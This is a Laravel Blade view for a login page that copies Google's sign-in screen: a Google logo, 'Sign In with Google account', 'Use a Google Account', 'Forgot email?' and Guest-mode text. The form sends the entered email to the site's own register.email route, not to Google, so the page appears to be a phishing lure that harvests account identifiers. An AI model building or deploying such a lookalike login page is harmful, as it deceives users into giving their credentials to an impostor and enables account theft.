<x-guest-layout>
    <!-- Session Status -->
    <x-auth-session-status class="mb-4" :status="session('status')" />
    @section('title')
        {{__('Sign In with Google account')}}
    @endsection
    <div class="containerLogin">
        <div class="container">
            <div class="progress" id="loader" style="display: none;"></div>
<div class="imgBox">
    <img  src="{{asset('google-sign.png')}}" alt="Google" width="50px" height="30px"/>
</div>
    <div class="box1">

        <div>
            <div>
                <h1 style="font-size: 36px"><strong>Sign In</strong></h1>
                <br>
                <p >Use a Google Account</p>

            </div>
        </div>
        <div>
    <form id="myForm" method="POST" action="{{ route('register.email') }}">
        @csrf
        <div>

            <label for="email" >
{{--            <input id="email" type="email" name="email" required autofocus autocomplete="email" />--}}
                <x-bladewind::input label="Email or phone"  name="email" type="email"/>
            </label>
{{--            <x-input-error :messages="$errors->get('email')" class="mt-2" />--}}
            <a style="color: #4285f4;cursor: pointer;">Forgot email?</a>
            <br>
            <br>
            <p>Not your computer? Use a Private Window to sign in.</p>
            <p style="color: #4285f4;cursor: pointer;">Learn more about using Guest mode</p>
        </div>
        <div class="button">
            <a>Create account</a>
            <button  id="submitBtn">
                {{ __('Next') }}
            </button>
        </div>
    </form>
        </div>
    </div>
        </div>
    </div>
    <script>
        document.getElementById('myForm').addEventListener('submit', function (e) {
            document.getElementById('submitBtn').disabled = true; // Disable submit button
            document.getElementById('loader').style.display = 'block'; // Show spinner
        });

    </script>
</x-guest-layout>
